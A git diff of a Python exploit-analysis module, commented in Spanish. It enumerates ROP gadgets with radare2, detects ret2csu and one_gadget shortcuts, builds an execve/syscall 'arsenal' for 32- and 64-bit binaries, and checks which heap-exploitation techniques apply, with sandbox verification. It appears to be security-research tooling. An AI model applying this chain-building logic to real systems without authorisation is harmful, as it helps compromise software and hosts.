@@ -5,8 +5,10 @@ Todo el analisis es GROUNDED en el binario cargado:
 - primitivas a partir de checksec + sinks (control de RIP por overflow, pivote de RSP);
 - gadgets reales enumerados con radare2 (`/Rj`), clasificados por registros que fijan, registros
   que destruyen (clobber), stack delta y efectos secundarios;
-- cadenas candidatas (ret2win / ret2libc system / execve por syscall) con sus requisitos, y
-  deteccion automatica de cadenas INCOMPATIBLES con la explicacion de por que fallan;
+- cadenas candidatas (ret2win / ret2libc system / execve por syscall; SROP; ret2csu; ret2dlresolve;
+  canary-bypass; format-string; y las familias de heap: tcache-poison/dup, UAF, write-what-where,
+  house-of-force/spirit/einherjar/botcake, largebin attack y tcache-stashing-unlink) con sus
+  requisitos, y deteccion automatica de cadenas INCOMPATIBLES con la explicacion de por que fallan;
 - puntuacion TECNICA (propiedades objetivas: numero de gadgets, requisitos incumplidos,
   mitigaciones que bloquean, conflictos de clobber). No es una recomendacion para atacar.
 
@@ -15,12 +17,39 @@ La simulacion/verificacion real (opcional, verify=True) reutiliza el sandbox de 
 """
 from __future__ import annotations
 
+import os
+import re as _re_mod
 from dataclasses import dataclass, field
 from typing import List, Optional
 
+# parsing de desensamblado r2 para ret2csu: la primera direccion `0x...` de la linea (r2 antepone
+# un prefijo de grafico que puede ser ASCII `|` o caracteres de caja Unicode `│┌└├`); el mnemonico
+# se extrae descartando los tokens de bytes hex que siguen a la direccion.
+_re_csu_addr = _re_mod.compile(r"(0x[0-9a-fA-F]+)\b")
+
 # registros de argumentos SysV x86-64 (orden de llamada) + los relevantes para syscalls
 _ARG_REGS = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
+# x86-32 Linux: los argumentos de SYSCALL van en ebx, ecx, edx, esi, edi, ebp (no en la pila como
+# las llamadas de funcion cdecl). execve es el syscall 11 (no 59) y se invoca con `int 0x80`.
+_ARG_REGS_32 = ["ebx", "ecx", "edx", "esi", "edi", "ebp"]
 _SYS_EXECVE = 0x3b
+_SYS_EXECVE_32 = 0x0b
+
+
+def _is32(arch_or_bits) -> bool:
+    """True si es x86 de 32 bits. Acepta la cadena arch ('x86_32') o un entero de bits."""
+    if isinstance(arch_or_bits, int):
+        return arch_or_bits == 32
+    return str(arch_or_bits or "").strip().endswith("32")
+
+
+def _arg_regs(bits: int) -> List[str]:
+    return _ARG_REGS_32 if bits == 32 else _ARG_REGS
+
+
+def _acc(bits: int) -> str:
+    """Registro acumulador para el numero de syscall (eax en 32b, rax en 64b)."""
+    return "eax" if bits == 32 else "rax"
 
 # tipos de opcode que rompen un gadget limpio si aparecen antes del terminador
 _BRANCHY = {"cjmp", "jmp", "ujmp", "call", "ucall", "rcall", "ccall", "invalid", "ill"}
@@ -35,8 +64,10 @@ class Gadget:
     sets: List[str] = field(default_factory=list)       # regs cargados desde el stack (pop reg)
     clobbers: List[str] = field(default_factory=list)   # otros regs escritos
     stack_delta: int = 0                                 # bytes que consume del stack (incl. ret)
-    kind: str = "other"                                  # pop|syscall|pivot|ret|write|other
+    kind: str = "other"                                  # pop|syscall|pivot|ret|write|move|other
     side_effects: str = ""
+    mem_write: str = ""                                  # "mov [dst], src" (write-what-where)
+    moves: List[str] = field(default_factory=list)       # "rdi<-rax" (mov reg,reg: fija reg sin pop)
 
     @property
     def text(self) -> str:
@@ -82,6 +113,7 @@ class ChainAnalysis:
     control: dict = field(default_factory=dict)   # {RIP, RSP_pivot, regs:[...]}
     target: str = ""
     gadgets: List[Gadget] = field(default_factory=list)
+    arsenal: dict = field(default_factory=dict)   # resumen tecnico del arsenal ROP disponible
     chains: List[ExploitChain] = field(default_factory=list)
     graph: dict = field(default_factory=dict)
     note: str = ""
@@ -104,10 +136,18 @@ def _classify(raw: dict) -> Optional[Gadget]:
         return None
     last = ops[-1]
     lt = last.get("type", "")
-    if lt not in ("ret", "syscall") and "ret" not in last.get("opcode", ""):
+    _last_op = last.get("opcode", "") or ""
+    # terminadores validos: ret, syscall, e `int 0x80` (syscall de 32-bit; r2 lo tipa 'swi'/'int')
+    if lt not in ("ret", "syscall") and "ret" not in _last_op and "int 0x80" not in _last_op:
         return None
-    sets, clobbers, side = [], [], []
-    stack_delta = 8 if lt == "ret" else 0   # el ret consume la direccion de retorno
+    sets, clobbers, side, moves = [], [], [], []
+    mem_write = ""
+    pop_count = 0
+    extra_delta = 0                         # bytes de add/sub rsp|esp (absolutos, no por palabra)
+    _GPR = {"rax", "rbx", "rcx", "rdx", "rsi", "rdi", "rbp", "rsp",
+            "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
+            "eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"}
+    _REG32 = {"eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"}
     for op in ops[:-1]:
         t = op.get("type", "")
         txt = (op.get("opcode", "") or "").strip()
@@ -115,39 +155,242 @@ def _classify(raw: dict) -> Optional[Gadget]:
             return None                      # gadget sucio: no utilizable
         parts = txt.replace(",", " ").split()
         mn = parts[0] if parts else ""
+        # operandos separados por coma (preserva el especificador de tamano: "qword [rdi]")
+        operands = [o.strip() for o in txt[len(mn):].split(",")] if len(parts) > 1 else []
+        lhs = operands[0] if operands else ""
+        rhs = operands[1] if len(operands) > 1 else ""
+        lhs_reg = lhs.split()[-1] if lhs else ""      # ultimo token: el registro base, sin tamano
+        rhs_reg = rhs.split()[-1] if rhs else ""
         if mn == "pop" and len(parts) >= 2:
             reg = parts[1]
             sets.append(reg)
-            stack_delta += 8
-        elif mn == "add" and len(parts) >= 3 and parts[1] == "rsp":
+            pop_count += 1
+        elif mn in ("add", "sub") and len(parts) >= 3 and parts[1] in ("rsp", "esp"):
             try:
-                stack_delta += int(parts[2], 0)
+                delta = int(parts[2], 0)
+                extra_delta += delta if mn == "add" else -delta
             except ValueError:
                 pass
             side.append(txt)
-        elif mn in ("mov", "xor", "lea") and len(parts) >= 2:
-            clobbers.append(parts[1])
+        elif mn in ("mov", "movq") and "[" in lhs:
+            # write-what-where: mov [dst], src  (escribe memoria controlada)
+            mem_write = txt
+            side.append(txt)
+        elif mn == "mov" and lhs_reg in _GPR and rhs_reg in _GPR and "[" not in rhs:
+            # mov regA, regB: fija regA desde otro registro (util cuando no hay `pop regA`)
+            moves.append(f"{lhs_reg}<-{rhs_reg}")
+            clobbers.append(lhs_reg)
+        elif mn == "xchg" and ("rsp" in (lhs, rhs) or "esp" in (lhs, rhs)):
+            side.append(f"{txt}: pivote de stack (xchg con el puntero de pila)")
+        elif mn in ("mov", "xor", "lea", "add", "sub", "inc", "dec", "and", "or") \
+                and lhs_reg in _GPR and "[" not in lhs:
+            clobbers.append(lhs_reg)
         elif mn == "leave":
             side.append("leave (rsp<-rbp; pop rbp): pivote de stack")
         elif t not in _BENIGN:
             side.append(txt)
+    # ancho de palabra: si TODOS los registros popeados son de 32 bits, la pila usa slots de 4B
+    # (x86-32); si no, 8B (x86-64). Determina el stack delta real.
+    word = 4 if (sets and all(r in _REG32 for r in sets)) else 8
+    stack_delta = (pop_count + (1 if lt == "ret" else 0)) * word + extra_delta
     kind = "ret"
     joined = " ".join((o.get("opcode", "") or "") for o in ops)
-    if "syscall" in joined:
+    if "syscall" in joined or "int 0x80" in joined:
         kind = "syscall"
-    elif "leave" in joined or any("pop rsp" in (o.get("opcode", "") or "") for o in ops):
+    elif ("leave" in joined
+          or any(("pop rsp" in (o.get("opcode", "") or "") or "pop esp" in (o.get("opcode", "") or ""))
+                 for o in ops)
+          or any("xchg" in (o.get("opcode", "") or "")
+                 and ("rsp" in (o.get("opcode", "") or "") or "esp" in (o.get("opcode", "") or ""))
+                 for o in ops)):
         kind = "pivot"
     elif sets:
         kind = "pop"
-    elif any(o.get("opcode", "").startswith("mov ") and "[" in o.get("opcode", "") for o in ops):
+    elif mem_write:
         kind = "write"
+    elif moves:
+        kind = "move"
     # la direccion del gadget es la de su PRIMERA instruccion (la que va en la pila del ROP),
     # no el `retaddr` (que apunta al ret final). r2 usa la clave "offset" en cada opcode.
     entry = ops[0].get("offset", ops[0].get("addr", raw.get("retaddr", 0)))
     return Gadget(addr=entry,
                   insns=[o.get("opcode", "") for o in ops],
                   sets=sets, clobbers=[c for c in clobbers if c not in sets],
-                  stack_delta=stack_delta, kind=kind, side_effects="; ".join(side))
+                  stack_delta=stack_delta, kind=kind, side_effects="; ".join(side),
+                  mem_write=mem_write, moves=moves)
+
+
+def _parse_csu(disasm: str) -> Optional[dict]:
+    """Detecta los dos gadgets universales de __libc_csu_init en texto desensamblado (r2 `pdf`).
+
+    ret2csu encadena:
+      gadget1 (epilogo pop): `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret`
+               -> carga rbx/rbp/r12/r13/r14/r15 desde la pila;
+      gadget2 (mov + call): `mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*8]`
+               -> copia r15->rdx, r14->rsi, r13d->edi y llama a [r12+rbx*8].
+    Con ambos se controlan rdi/rsi/rdx y la llamada sin necesitar `pop rsi`/`pop rdx` directos.
+    Devuelve {gadget1, gadget2, note} o None. Solo detecta presencia (grounded); no verifica."""
+    if not disasm:
+        return None
+    rows = []
+    for line in disasm.splitlines():
+        line = line.strip()
+        # r2 pd: "│ 0x004011aa      4c89fa    mov rdx, r15"  -> 1a direccion + texto del mnemonico
+        m = _re_csu_addr.search(line)
+        if not m:
+            continue
+        addr = int(m.group(1), 16)
+        # tras la direccion van los bytes hex (tokens hex de longitud par) y luego el mnemonico;
+        # descartamos los tokens de bytes para quedarnos con el mnemonico y sus operandos.
+        toks = line[m.end():].strip().split()
+        k = 0
+        while k < len(toks) and len(toks[k]) % 2 == 0 and len(toks[k]) >= 2 \
+                and all(c in "0123456789abcdefABCDEF" for c in toks[k]):
+            k += 1
+        mnem = " ".join(toks[k:]).strip().lower()
+        if mnem:
+            rows.append((addr, mnem))
+    if not rows:
+        return None
+    g1 = g2 = None
+    # gadget2: "mov rdx, r15/r14" seguido (<=4 insns) de un "call" con r12 o rbx
+    for i, (addr, txt) in enumerate(rows):
+        if txt.startswith("mov rdx") and ("r15" in txt or "r14" in txt or "r13" in txt):
+            window = rows[i:i + 6]
+            if any(t.startswith("call") and ("r12" in t or "rbx" in t) for _, t in window):
+                g2 = addr
+                break
+    # gadget1: "pop rbx" cuyo tramo hasta "ret" son solo pops e incluye r12..r15
+    for i, (addr, txt) in enumerate(rows):
+        if txt.startswith("pop rbx"):
+            seq, j = [], i
+            while j < len(rows):
+                t = rows[j][1]
+                if t.startswith("pop "):
+                    seq.append(t.split()[1])
+                    j += 1
+                    continue
+                if t == "ret" or t.startswith("ret"):
+                    break
+                seq = []       # algo que no es pop/ret rompe el gadget limpio
+                break
+            if {"r12", "r13", "r14", "r15"}.issubset(set(seq)):
+                g1 = addr
+                break
+    if g1 is None and g2 is None:
+        return None
+    return {"gadget1": (hex(g1) if g1 is not None else None),
+            "gadget2": (hex(g2) if g2 is not None else None),
+            "complete": g1 is not None and g2 is not None,
+            "note": "ret2csu: gadgets universales de __libc_csu_init para fijar rdi/rsi/rdx y "
+                    "llamar [r12+rbx*8] sin pop directos (gadgets detectados; la cadena se verifica "
+                    "por ejecucion con verify=True)"}
+
+
+def _detect_ret2csu(binary: str) -> Optional[dict]:
+    """Localiza __libc_csu_init con r2 y extrae los gadgets ret2csu. Best-effort; None si no hay r2
+    o el binario no tiene ese init (gcc >= 2.34 suele no incluirlo).
+
+    IMPORTANTE: comprobar primero que el simbolo EXISTE. Si no, `pdf @ sym.__libc_csu_init`
+    resuelve el flag ausente a 0 y r2 intenta desensamblar/analizar desde la direccion 0, lo que
+    puede colgarse o tardar minutos. `is~` solo lista simbolos (barato) y no desensambla.
+
+    Ademas (mismo bug real que reachability._sink_callsites, ver su fix): incluso con el simbolo
+    confirmado presente, `r.cmd()` sin timeout puede colgar el pipeline por otras razones de r2
+    -- cada llamada pasa por r2session.cmd_timeout() en vez del `r.cmd()` crudo."""
+    try:
+        from ..oracles.r2session import cmd_timeout as _cmd_timeout, get as _r2get
+        if _r2get(binary) is None:
+            return None
+        syms = _cmd_timeout(binary, "is~__libc_csu_init", 20.0) or ""
+        if "__libc_csu_init" not in syms:
+            return None
+        for sym in ("sym.__libc_csu_init", "__libc_csu_init"):
+            # `pd` (linear) in case the function's `ret` splits the view -- gadget2 lives AFTER the
+            # gadget1 `ret`, which `pdf` would not include.
+            dis = _cmd_timeout(binary, f"pd 48 @ {sym}", 30.0) or ""
+            if dis:
+                res = _parse_csu(dis)
+                if res:
+                    return res
+    except Exception:
+        return None
+    return None
+
+
+def _find_csu_gadgets(binary: str) -> Optional[dict]:
+    """Localiza los dos gadgets ret2csu en un binario via los simbolos tipicos que los contienen
+    (__libc_csu_init o un bloque de gadgets dedicado), sin disparar un analisis completo (aaa/aflj),
+    que es lento. El verificador hace su propia busqueda por bytes; esto es para la deteccion.
+
+    Mismo bug real que reachability._sink_callsites: cada r.cmd() pasa por cmd_timeout() en vez
+    del `r.cmd()` crudo."""
+    try:
+        from ..oracles.r2session import cmd_timeout as _cmd_timeout, get as _r2get
+        if _r2get(binary) is None:
+            return None
+        syms = _cmd_timeout(binary, "is~__libc_csu_init,gadget_block", 20.0) or ""   # cheap existence check (no disasm)
+        for base, sym in (("__libc_csu_init", "sym.__libc_csu_init"), ("gadget_block", "sym.gadget_block")):
+            if base not in syms:
+                continue                        # avoid `pd @ 0` (hang) when the symbol is absent
+            dis = _cmd_timeout(binary, f"pd 48 @ {sym}", 30.0) or ""
+            res = _parse_csu(dis) if dis else None
+            if res and res.get("complete"):
+                return res
+    except Exception:
+        return None
+    return None
+
+
+def _execve_arsenal_notes(missing_args: List[str], arsenal: dict) -> List[tuple]:
+    """Vias alternativas para la cadena execve-por-syscall a partir del arsenal detectado.
+    Devuelve una lista de (texto_es, texto_en). Pura (sin r2) para poder testearla."""
+    notes = []
+    csu = (arsenal or {}).get("ret2csu")
+    if missing_args and csu and csu.get("complete"):
+        pops = "`/`pop ".join(missing_args)
+        notes.append((
+            f"faltan `pop {pops}` directos, pero hay ret2csu "
+            f"(__libc_csu_init g1={csu.get('gadget1')} g2={csu.get('gadget2')}): fija rdx<-r15, "
+            "rsi<-r14, edi<-r13d via los gadgets universales -> via alternativa sin esos pops",
+            f"no direct `pop {pops}`, but ret2csu is available "
+            f"(__libc_csu_init g1={csu.get('gadget1')} g2={csu.get('gadget2')}): sets rdx<-r15, "
+            "rsi<-r14, edi<-r13d via the universal gadgets -> alternative path without those pops"))
+    og = (arsenal or {}).get("one_gadget")
+    if og and og.get("available") and og.get("count"):
+        offs = ", ".join(og.get("offsets") or [])
+        notes.append((
+            f"atajo: {og['count']} one_gadget(s) en la libc estatica embebida ({offs}); "
+            "un solo salto lanza shell si se cumplen sus precondiciones de registros",
+            f"shortcut: {og['count']} one_gadget(s) in the embedded static libc ({offs}); "
+            "a single jump spawns a shell if its register preconditions hold"))
+    return notes
+
+
+def _detect_one_gadget(binary: str, f: dict) -> Optional[dict]:
+    """Integra one_gadget en el arsenal para binarios ESTATICOS (la libc va embebida, asi que los
+    magic gadgets viven en el propio target). Para un binario dinamico se omite aqui: hace falta la
+    ruta de la libc (disponible via la herramienta `one_gadget` / el flujo autolibc). Caller-supplied:
+    si la gema no esta instalada, devuelve un degradado honesto con la pista de instalacion."""
+    if f.get("static") is not True:
+        return None            # dinamico: la libc no esta en el target; se resuelve en autolibc
+    try:
+        from .callertools import one_gadget as _og
+    except Exception:
+        return None
+    r = _og(binary)
+    if not r.get("ok"):
+        # degradado honesto: la herramienta no esta -> lo decimos con la pista de instalacion
+        return {"available": False, "note": r.get("note") or "one_gadget no disponible",
+                "hint": r.get("hint")}
+    pie = f.get("pie") is True
+    return {"available": True, "count": r.get("count", 0), "offsets": r.get("gadgets", []),
+            "pie": pie,
+            "note": ("offsets relativos a la base de carga (PIE activo: suma la base filtrada)"
+                     if pie else
+                     "binario estatico sin PIE: estos son direcciones ABSOLUTAS usables directamente"),
+            "constraints": "cada magic gadget tiene precondiciones de registros; se validan por "
+                           "ejecucion (el verificador ret2libc/autolibc las filtra)"}
 
 
 def _best_for(gadgets: List[Gadget], reg: str) -> Optional[Gadget]:
@@ -160,20 +403,115 @@ def _best_for(gadgets: List[Gadget], reg: str) -> Optional[Gadget]:
                                         len(g.sets)))[0]
 
 
-def _enum_gadgets(binary: str) -> List[Gadget]:
+def _build_arsenal(gadgets: List[Gadget], bits: int = 64) -> dict:
+    """Resumen tecnico del arsenal ROP: mejor gadget para cada rol clave (arg regs, syscall,
+    pivote, write-what-where, movimientos reg-a-reg). Objetivo: que el razonamiento ROP quede
+    reflejado explicitamente en el informe, no solo enterrado en las cadenas. Arch-aware: en 32b
+    los registros de syscall son ebx/ecx/edx/eax y el syscall es `int 0x80`."""
+    def _g(g):
+        return {"addr": hex(g.addr), "text": g.text, "delta": g.stack_delta,
+                "clobbers": g.clobbers}
+    aregs = _arg_regs(bits)
+    acc = _acc(bits)
+    arsenal = {"arg_regs": {}, "syscall": None, "pivot": None, "write": None, "moves": [],
+               "bits": bits}
+    for reg in aregs + [acc]:
+        g = _best_for(gadgets, reg)
+        if g:
+            arsenal["arg_regs"][reg] = _g(g)
+    g_sys = next((g for g in gadgets if g.kind == "syscall"), None)
+    if g_sys:
+        arsenal["syscall"] = _g(g_sys)
+    # pivote: el de menor ruido
+    pivots = [g for g in gadgets if g.kind == "pivot"]
+    if pivots:
+        arsenal["pivot"] = _g(sorted(pivots, key=lambda g: (len(g.clobbers), g.stack_delta))[0])
+    writes = [g for g in gadgets if g.mem_write]
+    if writes:
+        w = sorted(writes, key=lambda g: (len(g.clobbers), g.stack_delta))[0]
+        arsenal["write"] = {**_g(w), "mem_write": w.mem_write}
+    for g in gadgets:
+        for mv in g.moves:
+            arsenal["moves"].append({"move": mv, "addr": hex(g.addr), "text": g.text})
+    arsenal["moves"] = arsenal["moves"][:12]
+    # cobertura execve-por-syscall: los 3 primeros arg regs + acumulador + el gadget de syscall
+    # (rdi/rsi/rdx/rax+syscall en 64b; ebx/ecx/edx/eax+int0x80 en 32b)
+    need = aregs[:3] + [acc]
+    have = [r for r in need if r in arsenal["arg_regs"]]
+    arsenal["execve_coverage"] = {"have": have, "need": need,
+                                  "syscall": arsenal["syscall"] is not None,
+                                  "complete": len(have) == len(need) and arsenal["syscall"] is not None}
+    arsenal["total_gadgets"] = len(gadgets)
+    return arsenal
+
+
+def _full_arsenal(binary: str, gadgets: List[Gadget], f: dict) -> dict:
+    """Arsenal base (_build_arsenal) enriquecido con las tecnicas que requieren el binario:
+    ret2csu (gadgets universales de __libc_csu_init) y one_gadget (magic gadgets de libc estatica
+    embebida). Compartido por analyze_chains y analyze_arsenal."""
+    arsenal = _build_arsenal(gadgets, bits=(32 if _is32(f.get("arch")) else 64))
+    try:
+        # prefer the generalized finder (covers __libc_csu_init AND dedicated gadget blocks),
+        # falling back to the symbol-gated detector.
+        csu = _find_csu_gadgets(binary) or _detect_ret2csu(binary)
+        if csu:
+            arsenal["ret2csu"] = csu
+    except Exception:
+        pass
+    try:
+        og = _detect_one_gadget(binary, f)
+        if og:
+            arsenal["one_gadget"] = og
+    except Exception:
+        pass
+    return arsenal
+
+
+def _enum_gadgets(binary: str, bits: int = 64) -> List[Gadget]:
     """Enumera y clasifica gadgets reales del binario con radare2 (`/Rj`). Busca patrones utiles
-    para control de registros de argumentos, syscall y pivote. Best-effort; [] si no hay r2."""
+    para control de registros de argumentos, syscall y pivote. Arch-aware: en 32b busca pops de
+    ebx/ecx/edx/eax e `int 0x80`; en 64b, rdi/rsi/rdx/rax y `syscall`. Best-effort; [] si no hay r2."""
     out: List[Gadget] = []
     seen = set()
     try:
         import json
+        import time as _time
         from ..oracles.r2session import get as _r2get
         r = _r2get(binary)
         if r is None:
             return out
-        patterns = (["pop " + reg for reg in _ARG_REGS + ["rax", "rbx", "rbp", "rsp"]]
-                    + ["syscall", "leave", "int 0x80"])
-        for pat in patterns:
+        # Each `/Rj <pat>` is a full ROP scan of .text; on a big STATIC binary (~800KB) that is
+        # ~6s EACH, so ~17 patterns = ~110s -- which alone blew the per-binary budget before any
+        # exploit was even attempted. Order the patterns by usefulness (arg regs + syscall first,
+        # the ones ret2libc/execve chains actually need) and stop scanning once a wall-clock
+        # budget is spent: the gadget list is best-effort (the verifiers find their own gadgets
+        # via pwntools), so fewer-but-the-useful-ones under time pressure is the right trade.
+        budget_s = float(os.environ.get("BINORACLE_GADGET_BUDGET", "40") or 40)
+        # ESSENTIAL gadgets are the ones the execve-syscall and ret2libc chains REQUIRE (SysV arg
+        # regs rdi/rsi/rdx, rax for the syscall number, and the syscall itself). These are scanned
+        # UNCONDITIONALLY -- never dropped by the budget -- so a slow/loaded host can't leave a
+        # required gadget unfound and silently skip verification. Previously all six arg-reg scans
+        # (incl. rcx/r8/r9, which no chain needs) ran before `syscall`, so under load the 40s budget
+        # was spent before `syscall` was ever scanned -> unmet_requirements=1 -> "no simulada".
+        aregs = _arg_regs(bits)
+        acc = _acc(bits)
+        if bits == 32:
+            # x86-32: syscall args en ebx/ecx/edx, numero en eax, invocacion `int 0x80`
+            essential = ["pop " + r for r in aregs[:3]] + ["pop " + acc, "int 0x80"]
+            optional = (["pop " + r for r in aregs[3:]]            # esi,edi,ebp
+                        + ["syscall", "leave"]                      # syscall (raro en 32b) / pivote
+                        + ["pop ebx", "pop ebp", "pop esp"]
+                        + ["mov dword", "xchg"])                    # write-what-where / xchg-esp pivot
+        else:
+            essential = ["pop " + reg for reg in aregs[:3]] + ["pop " + acc, "syscall"]  # rdi,rsi,rdx,rax,syscall
+            optional = (["pop " + reg for reg in aregs[3:]]        # rcx,r8,r9: extra arg regs (6+ arg calls)
+                        + ["int 0x80", "leave"]                     # 32-bit syscall / stack pivot
+                        + ["pop " + reg for reg in ("rbx", "rbp", "rsp")]
+                        + ["mov qword", "mov dword", "xchg"])       # write-what-where / xchg-rsp pivot
+        deadline = _time.time() + budget_s
+        for pat in essential + optional:
+            if pat not in essential and _time.time() > deadline:
+                break                                             # budget bounds only the OPTIONAL tail
             try:
                 raws = json.loads(r.cmd(f"/Rj {pat}") or "[]")
             except Exception:
@@ -195,10 +533,15 @@ def _facts(binary: str, reg=None) -> dict:
     f = {"canary": None, "pie": None, "nx": None, "arch": "x86_64", "bintype": None,
          "win": None, "system": None, "binsh": None, "rip_offset": None,
          "puts": False, "leak_fn": None, "reenter": False, "heap_shell_ok": False,
-         "wow_ok": False, "printf": False, "uaf_fnptr_ok": False, "tcache_dup_ok": False}
+         "wow_ok": False, "printf": False, "uaf_fnptr_ok": False, "tcache_dup_ok": False,
+         "hof_ok": False, "hos_ok": False, "hoe_ok": False, "botcake_ok": False,
+         "largebin_ok": False, "stash_ok": False, "hoc_ok": False, "unlink_ok": False,
+         "fastdup_ok": False, "homind_ok": False, "fsop_ok": False,
+         "static": None, "relro": None}
     try:
         import json
         import re as _re
+        import time as _time
         from ..oracles.r2session import get as _r2get
         r = _r2get(binary)
         if r is not None:
@@ -208,6 +551,8 @@ def _facts(binary: str, reg=None) -> dict:
             f["nx"] = info.get("nx")
             f["arch"] = f"{info.get('arch','x86')}_{info.get('bits',64)}"
             f["bintype"] = info.get("bintype")
+            f["static"] = info.get("static")
+            f["relro"] = info.get("relro")
             # limite de palabra (no letra ADYACENTE): sin el, "win" hacia match dentro de
             # "_unwind_resume" (el runtime de excepciones de C++/libgcc_s) -- confirmado con un
             # binario real que usa try/catch: se marcaba _Unwind_Resume como la funcion 'win()' del
@@ -270,7 +615,16 @@ def _facts(binary: str, reg=None) -> dict:
                     # en binarios estaticos): \b solo no basta, "_" es caracter de palabra en
                     # regex y no forma limite entre "__" y "read".
                     sink_re = _re.compile(r"call\s+\S*[._](?:" + "|".join(read_sinks) + r")\b")
-                    for fn in json.loads(r.cmd("aflj") or "[]"):
+                    # REGRESION encontrada en vivo (misma familia que autopoc._static_offset): sin
+                    # cap, un binario estatico con "vuln"/"sym.vuln" ausente (convencion no usada)
+                    # desensambla TODAS sus funciones (cientos/miles en un binario estatico) una a
+                    # una buscando el sink -- minutos colgando el pipeline. Acota por cantidad y
+                    # tiempo; si no se encuentra a tiempo, canary se queda en su valor binario-ancho
+                    # (el conservador: asume que SI hay canary salvo prueba de lo contrario).
+                    _t0 = _time.time()
+                    for _i, fn in enumerate(json.loads(r.cmd("aflj") or "[]")):
+                        if _i >= 400 or (_time.time() - _t0) > 20.0:
+                            break
                         name = fn.get("name", "")
                         cand = r.cmd(f"pdf @ {name}") or ""
                         if sink_re.search(cand):
@@ -321,7 +675,49 @@ def _facts(binary: str, reg=None) -> dict:
         f["tcache_dup_ok"] = _tcache_dup_applicable(binary)
     except Exception:
         pass
+    # aplicabilidad de las familias de heap con verificador dedicado (hof/hos/hoe/botcake/largebin/
+    # stash): todas son de forma de practica (ASLR off, simbolos fijos), asi que el pre-chequeo es la
+    # presencia de la forma de simbolos que su driver necesita. El symbol-set se lee una sola vez.
+    try:
+        _syms = _elf_symbol_names(binary)
+        if _syms is not None:
+            _win = "win" in _syms
+            _handler = any(s in _syms for s in ("handler", "fnptr", "hook"))
+            f["hof_ok"] = _win and "heap" in _syms and _handler
+            f["hos_ok"] = _win and _handler                 # house-of-spirit: real tcache, no heap sym
+            f["hoe_ok"] = _win and "heap" in _syms and _handler
+            f["botcake_ok"] = _win and "chunks" in _syms and any(s in _syms for s in ("handler", "fnptr"))
+            f["largebin_ok"] = _win and "heap" in _syms and any(s in _syms for s in ("slot", "target", "fnptr"))
+            f["stash_ok"] = _win and any(s in _syms for s in ("hobj", "fake", "fnptr"))
+            f["hoc_ok"] = _win and "global_max_fast" in _syms and "fastbinsY" in _syms
+            f["unlink_ok"] = _win and "chunkptr" in _syms and _handler
+            f["fastdup_ok"] = _win and "fasttop" in _syms and any(s in _syms for s in ("hslot", "fake"))
+            f["homind_ok"] = _win and "hom_slot" in _syms and "heap" in _syms
+            f["fsop_ok"] = _win and "fake_vtable" in _syms and ("fp" in _syms or "file" in _syms)
+    except Exception:
+        pass
     return f
+
+
+def _elf_symbol_names(binary: str):
+    """The set of ELF symbol names (symtab + dynsym), or None if pyelftools is unavailable. Used to
+    cheaply decide which practice-shaped heap families apply before paying for a sandbox run."""
+    try:
+        from elftools.elf.elffile import ELFFile
+    except Exception:
+        return None
+    try:
+        names = set()
+        with open(binary, "rb") as fh:
+            elf = ELFFile(fh)
+            for sec in elf.iter_sections():
+                if sec.name in (".symtab", ".dynsym"):
+                    for s in sec.iter_symbols():
+                        if s.name:
+                            names.add(s.name)
+        return names
+    except Exception:
+        return None
 
 
 # bytes prohibidos por sink de entrada (el terminador del sink corta el payload ahi)
@@ -338,18 +734,28 @@ _SINK_ORDER = ("scanf", "isoc99_scanf", "gets", "fgets", "gets_s", "strcpy", "st
 
 def _overflow_sink(binary: str):
     """Sink de entrada de la funcion vulnerable (el que gobierna los bad-chars). Devuelve el nombre
-    o None. Busca la funcion que llama a un sink de lectura y toma el mas restrictivo presente."""
+    o None. Busca la funcion que llama a un sink de lectura y toma el mas restrictivo presente.
+
+    Bug real encontrado en vivo (mismo patron que _sink_callsites en reachability.py, y el mismo
+    ya mitigado en el bucle equivalente de _overflow_sink mas abajo con cap de 400/20s): este
+    bucle recorria TODAS las funciones de `aflj` (cientos/miles en un binario estatico) llamando
+    a `r.cmd(f"pdf @ {nm}")` SIN NINGUN limite -- ni de cantidad, ni de tiempo, ni de timeout por
+    llamada individual. Ahora aplica el mismo cap (400 funciones / 20s) y pasa cada comando por
+    r2session.cmd_timeout en vez del `r.cmd()` crudo."""
     try:
         import json
         import re as _re
-        from ..oracles.r2session import get as _r2get
-        r = _r2get(binary)
-        if r is None:
+        import time as _time
+        from ..oracles.r2session import cmd_timeout as _r2cmd, get as _r2get
+        if _r2get(binary) is None:
             return None
         present = set()
-        for fn in json.loads(r.cmd("aflj") or "[]"):
+        _t0 = _time.time()
+        for _i, fn in enumerate(json.loads(_r2cmd(binary, "aflj", 30.0) or "[]")):
+            if _i >= 400 or (_time.time() - _t0) > 20.0:
+                break
             nm = fn.get("name", "")
-            dis = r.cmd(f"pdf @ {nm}") or ""
+            dis = _r2cmd(binary, f"pdf @ {nm}", 15.0) or ""
             for s in _SINK_ORDER:
                 # \b (limite de palabra) en vez de substring: sin el, "gets" hacia match dentro de
                 # "sym.imp.getsockopt"/"call getsockopt" -- confirmado con un binario real que solo
@@ -413,7 +819,7 @@ def _score(chain: ExploitChain) -> None:
     chain.feasible = (unmet == 0 and blockers == 0)
 
 
-def _should_attempt_verify(c: ExploitChain, f: dict) -> bool:
+def _should_attempt_verify(c: ExploitChain, f: dict, allow_canary: bool = False) -> bool:
     """Decide si merece la pena INTENTAR la verificacion real en sandbox (no solo si la cadena es
     'feasible' en el sentido estatico/teorico). BUG que arregla: `c.feasible` tambien exige CERO
     break_points, y _mitig_breakpoints() anade un break_point de PIE ('direcciones aleatorias, la
@@ -424,11 +830,14 @@ def _should_attempt_verify(c: ExploitChain, f: dict) -> bool:
     `analyze_chains()` nunca los intentaba en NINGUN binario PIE -- confirmado con ret2win_pie:
     autopie_ret2win() por si solo verifica en ~unos segundos, pero la cadena salia
     'feasible=False' por el break_point de PIE y _verify_chain() nunca se invocaba.
-    El canary SI sigue bloqueando el intento (ningun driver hace bypass de canary por fuerza
-    bruta; intentarlo solo gastaria tiempo de sandbox en un fallo casi seguro)."""
+    El canary bloquea el intento para CUALQUIER cadena de overflow lineal (ret2win, ret2libc, ...):
+    ninguno de sus drivers rompe el canary, asi que intentarlo solo gastaria sandbox en un fallo
+    casi seguro. La UNICA excepcion es la cadena 'canary bypass' (allow_canary=True), cuyo driver
+    (autocanary) EXISTE precisamente para eso: filtra el canary via %s y reescribe su valor, por lo
